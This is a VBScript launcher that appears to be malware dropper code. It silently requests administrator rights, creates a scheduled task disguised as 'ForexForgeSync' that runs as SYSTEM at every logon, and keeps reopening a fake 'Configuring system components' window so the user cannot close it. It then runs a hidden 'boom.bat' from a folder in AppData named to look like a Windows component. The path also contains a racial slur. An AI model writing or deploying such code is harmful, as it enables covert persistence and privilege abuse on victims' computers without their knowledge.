Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' --- CONFIGURATION ---
' Your specific folder path
strPath = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics"
strScript = strPath & "\launcher.vbs"
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION CHECK ---
If Not WScript.Arguments.Named.Exists("task") And Not WScript.Arguments.Named.Exists("elevate") Then
    ' Request Admin rights hidden (0)
    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: THE UN-KILLABLE TASK CREATION & DISTRACTION ---
strTaskName = "ForexForgeSync"
strRunCmd = "wscript.exe //B """ & strScript & """ /task"

' This is the EXACT command that will re-open if closed
' We use /SC ONLOGON to ensure it runs every time the user logs in
strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr """ & strRunCmd & """ /sc onlogon /rl highest /ru ""SYSTEM"" /f"

' Start the 30-second loop
startTime = Timer
Do While Timer < startTime + 30
    ' This runs the task creation and the blue distraction together.
    ' If the user closes this window, the 'True' argument tells VBS to loop immediately.
    WshShell.Run "cmd.exe /c title System Configuration && color 1f && echo. && echo  Configuring system components... Please wait. && echo  Do not close this window to ensure proper installation. && " & strCreateTask & " && timeout /t 30 /nobreak > nul", 1, True
    
    ' If they closed it before 30 seconds, wait 0.5s and pop it back up
    If Timer < startTime + 30 Then 
        WScript.Sleep 500 
    End If
Loop

' --- STEP 3: RUN INITIAL SETUP (BOOM.BAT) ---
' Only run boom.bat if we just finished the first-time elevation
If WScript.Arguments.Named.Exists("elevate") Then
    If FSO.FileExists(strPath & "\boom.bat") Then
        WshShell.Run "cmd.exe /c boom.bat", 0, True
    End If
End If

WScript.Quit
